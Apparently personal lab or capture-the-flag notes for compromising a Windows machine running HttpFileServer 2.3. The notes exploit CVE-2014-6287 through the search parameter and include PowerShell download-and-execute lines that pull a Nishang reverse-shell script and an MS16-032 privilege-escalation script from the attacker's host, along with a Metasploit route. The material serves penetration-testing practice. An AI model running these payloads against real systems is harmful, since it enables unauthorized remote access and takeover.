nmap -sC -sV 10.10.10.8

port http 80 is open : HttpFileServer - HFS 2.3


way 1 (with powershell_without metasploit):
---------------------------

google: httpfileserver exploit ----> found > CVE-2014-6287

cve-2014-6287:
--------------
allows to execute command by type %00 in search field

*google : HFS scripting
the command is interesting : exec command ----> {.exec|ping <host_ip_addr>.}
on host: tcpdump -i tun0 >>>> to see of we get a ping

get reverse shell:
-----------------

google: nishang - Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.

go to : nishang/Shells

>cp Invoke-PowerShellTcp.ps1 ~/path_location
*edit script:
add at the buttom:
------------------
Invoke_PowerShellTcp -Reverse -IPAddress <host_ip_addr> -Port 4444

run netcat listener on host
run python http server
on burp execute command : GET /?search=%00{/exec|c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe ping.} ---> dont forget to URL encode
on host: tcpdump -i tun0 >>>> to see of we get a ping
on burp execute command : GET /?search=%00{/exec|c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadingString('http://<host_ip_addr>/Invoke-PowerShellTcp.ps1').} ---> dont forget to URL encode

got a shell - GOT USER

PE:
---

>sysinfo
*transfer Sherlock.ps1 to victim

use MS16_032 exploit powershell
PowerShellEmpire has that exploit ---> /opt/Empire/data/module_source/privesc/Invoke-MS16032.ps1
*copy script to current directory
** edit the script:
add at buttom >> Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://<hst_ip_addr>:<port>/shell.ps1')"
on host> make one more nc listener
on shell : iex(New-Object Net.WebClient).DownloadString('http://<hst_ip_addr>:<port>/Invoke-MS16032.ps1')

and GOT R O O T !


way 2 (with metasploit):
------------------------
>msfconsole
>serach hfs

in post exploitation: check > sysinfo ---> to see if X64 or X86
when use suggester we will first try the exploits which work with both ^
and in we need to change from X86 to X64 :
>ps
>migrate <to_process_uses_X64> 
